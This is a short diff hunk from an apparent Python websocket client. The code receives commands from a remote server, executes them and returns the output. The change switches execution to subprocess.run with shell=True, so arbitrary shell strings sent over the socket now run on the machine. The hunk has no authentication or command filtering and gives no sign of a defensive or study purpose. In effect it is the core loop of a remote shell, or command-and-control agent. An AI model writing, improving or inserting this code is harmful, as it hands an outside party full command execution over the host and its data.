@@ -36,11 +36,8 @@ async def hello():
                 while 1:
                         await websocket.send(msg)
                         cmd = await websocket.recv()
-                        with subprocess.Popen([cmd],stdout=subprocess.PIPE,bufsize=1,universal_newlines=True) as process:
-                                for line in process.stdout:
-                                        line = line.rstrip()
-                                        print(f"line = {line}")
-                                        await websocket.send(line)
+                        process = subprocess.run([cmd],stdout=subprocess.PIPE,bufsize=1,universal_newlines=True,shell=True)
+                        await websocket.send(process.stdout)
                         #os.system(cmd)
 
 asyncio.get_event_loop().run_until_complete(hello())
